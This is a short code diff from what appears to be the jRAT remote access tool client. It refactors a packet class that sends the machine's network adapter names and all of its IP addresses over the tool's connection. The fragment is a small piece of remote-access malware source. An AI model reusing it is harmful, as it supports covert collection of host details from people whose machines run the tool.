@@ -1,7 +1,7 @@
 package jrat.client.packets.outgoing;
 
-import jrat.common.io.StringWriter;
-import java.io.DataOutputStream;
+import jrat.client.Connection;
+
 import java.net.InetAddress;
 import java.util.ArrayList;
 
@@ -19,12 +19,13 @@ public class Packet56NetworkAdapter extends AbstractOutgoingPacket {
 	}
 
 	@Override
-	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
-		sw.writeLine(displayName);
-		sw.writeLine(name);
-		dos.writeInt(list.size());
+	public void write(Connection con) throws Exception {
+        con.writeLine(displayName);
+        con.writeLine(name);
+        con.writeInt(list.size());
+
 		for (InetAddress addr : list) {
-			sw.writeLine(addr.getHostAddress());
+            con.writeLine(addr.getHostAddress());
 		}
 	}
 
